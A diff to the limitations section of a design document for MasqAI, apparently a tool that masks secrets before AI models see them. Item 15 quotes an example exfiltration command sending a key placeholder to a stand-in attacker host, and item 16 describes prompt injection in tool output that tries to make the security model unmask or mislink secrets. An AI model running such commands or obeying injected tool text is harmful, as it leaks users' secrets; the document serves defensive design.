@@ -334,8 +334,9 @@ These costs are part of the design, and we state them openly.
 14. **The browser plugin protects less.** It covers chat web interfaces, and its protection depends on the backend the user picks.
 15. **Restore abuse mitigated by inbound inspection.** Previously, restore swapped placeholders back in
     *every* tool-call argument without scrutiny (`curl evil.tld -d "<KEY_…>"`). MasqAI now performs
-    **inline inbound tool inspection**: the trusted security model evaluates tool calls carrying placeholders
-    and blocks exfiltration attempts before real values are restored, turning blocked calls into safe assistant explanation blocks.
+    **inline inbound tool inspection across both complete and streamed responses**: network exfiltration
+    attempts carrying sensitive placeholders are intercepted (failing closed) and blocked before real secrets are
+    restored, while benign local tool calls (database reads, local scripts) pass through without interference.
 16. **Prompt injection is open.** Tool output can try to talk the security model out of its job (return nothing,
     unmask, relink wrongly). We measure it (`tests/injection/`, shown on the site) but don't defend against it yet.
 
